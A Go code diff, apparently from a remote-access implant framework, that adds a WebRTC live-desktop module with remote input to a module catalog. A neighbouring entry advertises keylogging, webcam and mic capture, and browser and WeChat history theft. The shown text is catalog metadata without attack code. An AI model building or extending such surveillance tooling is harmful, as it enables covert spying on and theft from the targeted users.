@@ -87,6 +87,18 @@ var agentModuleCatalog = []AgentModule{
 		},
 	},
 	{
+		Name:        "webrtc",
+		Title:       "WebRTC live desktop",
+		Description: "real-time H.264 screen streaming over WebRTC (Pion) with TURN relay and remote input over the signaling channel; requires ffmpeg on the target and a server with webrtc.enabled",
+		Tasks: []string{
+			"screen_webrtc_start", "screen_webrtc_stop",
+		},
+		RegistryFiles: []string{"task_registry_webrtc.go"},
+		ExclusiveFiles: []string{
+			"task_screen_webrtc.go",
+		},
+	},
+	{
 		Name:        "collection",
 		Title:       "Collection",
 		Description: "clipboard, keylogger, webcam/mic capture and browser/WeChat history theft",
